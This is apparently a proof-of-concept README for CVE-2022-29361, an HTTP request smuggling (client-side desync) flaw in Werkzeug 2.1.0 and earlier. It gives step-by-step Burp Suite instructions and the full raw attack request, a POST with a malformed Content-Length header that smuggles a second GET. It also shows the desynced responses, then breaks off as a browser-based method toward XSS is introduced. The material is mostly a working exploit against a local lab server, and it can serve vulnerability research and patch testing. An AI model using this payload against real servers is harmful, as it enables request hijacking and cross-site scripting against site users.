# Werkzeug CVE-2022-29361
Proof of Concept of [CVE-2022-29361](https://nvd.nist.gov/vuln/detail/cve-2022-29361) occuring in [Werkzeug](https://werkzeug.palletsprojects.com/) version <= 2.1.0. Werkzeug is a comprehensive WSGI web application library. The CVE, published on 24 May 2022 has a score of 9.8 (critical) and the following vector:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

## Steps to reproduce the attack

### Method 1. Using Burp Suite
1. Send ```GET``` request to ```/``` using the Burp Suite browser send the request to the repeater. The complete URL is [127.0.0.1:5001](127.0.0.1:5001). This request can be considered as attack request.
2. Right click in the request field and change request method to ```POST```.
3. Disable ```Update Content-Length``` and enable ```HTTP/1 connection reuse``` under the settings icon right next to the ```Send``` button.
4. Add a ```Connection``` field and set this to ```keep-alive```.
5. Send another ```GET``` request to the repeater and group both requests together in a group. This second request can be considered as normal request.
6. Click on the dropdown next to the ```Send``` button and change the mode to ```Send group (single connection)```.
7. Note that both HTTP requests are set to HTTP/1. This can be validated in the inspector menu on the right side of the screen.

#### Attack request
This is the attack request containing a smuggled ```GET``` request. The response to this request is based on the ```POST``` request shown below.

<table>
<tr>
<th>Request</th>
<th>Response</th>
</tr>
<tr>
<td>

```http
POST / HTTP/1.1
Host: 127.0.0.1:5001
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length : 500

GET /test404 HTTP/1.1
Foo: X
```

</td>
<td>

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.0 Python/3.10.13
Date: Tue, 16 Jan 2024 12:46:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 95

<h1>CVE-2022-29361 | Client-Side Desync to XSS</h1>
<script src='/static/main.js'></script>
```

</td>
</tr>
</table>

#### Normal request
The normal request usually respond with a ```HTTP 200 OK``` status code. But in this request the desync becomes visible. The response is actually the response for a ```GET``` request to ```/test404``` smuggled in the attack request as shown above.

<table>
<tr>
<th>Request</th>
<th>Response</th>
</tr>
<tr>
<td>

```http
GET / HTTP/1.1
Host: 127.0.0.1:5001
Connection: close
```

</td>
<td>

```http
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.0 Python/3.10.13
Date: Tue, 16 Jan 2024 13:35:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 232

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

</td>
</tr>
</table>

### Method 2. Using browser
To make this attack a browser-powered desync attack, it must be possible to execute this desync in a browser.